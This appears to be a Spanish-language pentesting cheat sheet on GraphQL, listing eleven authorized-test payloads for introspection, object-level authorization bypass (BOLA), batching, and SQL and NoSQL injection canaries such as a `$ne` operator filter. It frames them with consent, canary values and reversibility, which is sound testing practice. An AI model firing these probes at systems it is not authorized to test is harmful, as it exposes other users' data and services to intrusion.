# 🗡️ GraphQL: introspección, inyección y autorización: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Endpoint GET

**Objetivo:** Comprobar si el servicio acepta query por URL.

```http
GET /graphql?query=%7B__typename%7D HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** `__typename` muestra que GraphQL responde; no es una vulnerabilidad.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).

### 2. Introspección mínima

**Objetivo:** Conocer nombre de tipo raíz sin volcar todo el esquema.

```json
{"query":"{__schema{queryType{name}mutationType{name}}}"}
```

**Interpretación:** Introspección habilitada es inventario; el hallazgo requiere un resolver inseguro o datos sensibles.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

### 3. Tipo específico

**Objetivo:** Consultar los campos de un tipo conocido del esquema.

```json
{"query":"{__type(name:\"User\"){name fields{name type{name kind}}}}"}
```

**Interpretación:** Requiere que el tipo exista; respetar límites de consulta del programa.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).

### 4. Sugerencias por error

**Objetivo:** Obtener una pista de campo sin introspección completa.

```json
{"query":"{nombrEInexistente}"}
```

**Interpretación:** Una sugerencia de nombre no equivale a fuga sensible. No usar fuerza bruta masiva.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

### 5. BOLA por node ID

**Objetivo:** Comparar acceso a objetos propios de cuentas A y B.

```json
{"query":"query($id:ID!){node(id:$id){id}}","variables":{"id":"{ID_CONTROLADO_B}"}}
```

**Interpretación:** Con token A, un dato privado de B confirma control roto por objeto; comprobar que el ID sea válido.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

### 6. Relación anidada

**Objetivo:** Probar autorización en campos hijo, no solo raíz.

```graphql
query { project(id:"{PROYECTO_PROPIO}") { id documents { id owner { id } } } }
```

**Interpretación:** Revisar si algún documento de B aparece por una relación accesible a A.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).

### 7. Aliasing limitado

**Objetivo:** Medir si dos resolvers costosos comparten presupuesto por solicitud.

```graphql
query { a: search(q:"canary-A"){id} b: search(q:"canary-B"){id} }
```

**Interpretación:** Solo dos alias de prueba. Respuestas duplicadas no implican bypass de rate limit sin medir el contador.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

### 8. Batch JSON de dos queries

**Objetivo:** Verificar si el endpoint procesa listas de operaciones.

```json
[{"query":"{__typename}"},{"query":"{__typename}"}]
```

**Interpretación:** Una API puede aceptar batching legítimamente; comprobar cuota y permisos por operación.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).

### 9. Argumento SQL como canary

**Objetivo:** Probar si un resolver concatena un parámetro en SQL.

```json
{"query":"query($q:String!){search(q:$q){id}}","variables":{"q":"canary'"}}
```

**Interpretación:** Solo si `search` existe; un error GraphQL de validación no demuestra SQLi de backend.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).

### 10. Variable JSON hacia NoSQL

**Objetivo:** Comprobar operadores cuando el esquema permite scalar JSON.

```json
{"query":"query($f:JSON){search(filter:$f){id}}","variables":{"f":{"name":{"$ne":"canary-inexistente"}}}}
```

**Interpretación:** Requiere scalar flexible y resolver NoSQL; comparar con valor literal y registros propios.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).

### 11. Mutación con rol bajo

**Objetivo:** Comprobar política de función en una mutación reversible.

```graphql
mutation { updateOwnTestObject(id:"{ID_PROPIO}", name:"canary-{NONCE}") { id name } }
```

**Interpretación:** Comparar con política del rol. La mutación de ejemplo debe adaptarse al esquema real.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
